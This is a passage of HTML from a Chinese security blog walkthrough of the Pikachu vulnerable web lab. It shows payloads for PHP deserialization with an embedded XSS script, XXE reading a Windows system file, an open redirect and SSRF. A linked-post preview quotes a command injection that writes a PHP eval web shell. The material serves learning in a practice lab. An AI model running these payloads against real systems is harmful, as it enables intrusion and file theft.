+<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a><strong>php反序列化</strong></h1><ul>
+<li>payload：<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;&#125;</code></li>
+</ul>
+<style>.duuzsssslurw{zoom:25%;}</style><img src="/2025/06/17/pikachu/22.png" class="duuzsssslurw">
+
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a><strong>XXE</strong></h1><p>payload: </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<style>.vddqemvmewsc{zoom:25%;}</style><img src="/2025/06/17/pikachu/23.png" class="vddqemvmewsc">
+
+<h1 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a><strong>URL跳转</strong></h1><ul>
+<li>抓包把url参数改为<code>http://www.bilibili.com</code>会跳转到b站</li>
+</ul>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a><strong>SSRF</strong></h1><ul>
+<li><p><strong>curl：</strong></p>
+<style>.uynvlrocthkq{zoom:25%;}</style><img src="/2025/06/17/pikachu/24.png" class="uynvlrocthkq">
+</li>
+<li><p><strong>file_get_content：</strong></p>
+<style>.xbtwttjuqham{zoom:25%;}</style><img src="/2025/06/17/pikachu/25.png" class="xbtwttjuqham"></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">StarWhale</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/17/pikachu/">http://example.com/2025/06/17/pikachu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">StarWhale</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/15/webone.pcap/" title="webone.pcap题目复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">webone.pcap题目复现</div></div><div class="info-2"><div class="info-item-1">1.某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 http contains &quot;扫描器关键词&quot;  acunetix   —   AWVS  sqlmap（sql注入常在user-agent字段注入，排查语法：http.user_agent contains &quot;sqlmap&quot;）  nmap    （扫描结果为空）  nessus   （扫描结果为空）  Appscan（扫描结果为空） .nodiwepyqvju{zoom:25%;}  .pevozfvqhcdq{zoom:25%;}    2.某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)登录后台：/admin/login.php 排查语句：http contains &quot;login&quot; &amp;&amp;...</div></div></div></a><a class="pagination-related" href="/2025/06/06/DVWA/" title="DVWA（未完）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DVWA（未完）</div></div><div class="info-2"><div class="info-item-1"> net user查看用户 net localgroup administrators查看管理员用户 net user test 123 /add系统会创建一个名为 test 的用户，其密码为 123。  a &amp;&amp; b ：先执行命令a再执行命令b，命令a执行正确才会执行命令b，在a执行失败的情况下不会执行b命令。所以又被称为短路运算符。a &amp; b：先执行命令a再执行命令b，如果a执行失败，还是会继续执行命令b。也就是说命令b的执行不会受到命令a的干扰。a || b：先执行a命令再执行b命令，如果a命令执行成功，就不会执行b命令，相反，如果a命令执行不成功，就会执行b命令。a | b：将前一个命令的输出作为后一个命令的输入  systeminfo : Windows 系统中用于显示计算机硬件和软件详细信息的命令行工具  ping 127.0.0.1 &amp; echo &quot;&lt;?php phpinfo();@eval($_POST[&quot;X&quot;])?&gt;&quot; &gt; 111.php 注意:  shell_exec...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">StarWhale</div><div class="author-info-description">抬头看，满天星光甚烂漫；低头看，满路荆棘已过半</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>关注我</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%8F%8D%E5%B0%84%E6%80%A7XSS-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-DOM%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">XSS:反射性XSS;存储型XSS;DOM型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">6.</span> <span class="toc-text">File Inclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-Filedownload"><span class="toc-number">7.</span> <span class="toc-text">Unsafe Filedownload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#over-permission"><span class="toc-number">8.</span> <span class="toc-text">over permission</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A"><span class="toc-number">9.</span> <span class="toc-text">路径穿越</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">10.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">11.</span> <span class="toc-text">php反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">12.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URL%E8%B7%B3%E8%BD%AC"><span class="toc-number">13.</span> <span class="toc-text">URL跳转</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">14.</span> <span class="toc-text">SSRF</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/04/computerOrg/" title="计算机组成原理">计算机组成原理</a><time datetime="2025-12-04T15:09:53.370Z" title="发表于 2025-12-04 23:09:53">2025-12-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/08/ctf.yijinglab.com/" title="CTF-Web">CTF-Web</a><time datetime="2025-10-08T09:53:55.564Z" title="发表于 2025-10-08 17:53:55">2025-10-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/18/yijing24/" title="蚁景">蚁景</a><time datetime="2025-09-18T13:13:33.089Z" title="发表于 2025-09-18 21:13:33">2025-09-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/06/NSSCTF-SQL/" title="SQL注入题记录">SQL注入题记录</a><time datetime="2025-09-06T07:25:23.132Z" title="发表于 2025-09-06 15:25:23">2025-09-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/13/Linux/" title="Linux">Linux</a><time datetime="2025-08-13T06:02:34.541Z" title="发表于 2025-08-13 14:02:34">2025-08-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By StarWhale</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.2.2"></script><script src="/js/main.js?v=5.2.2"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
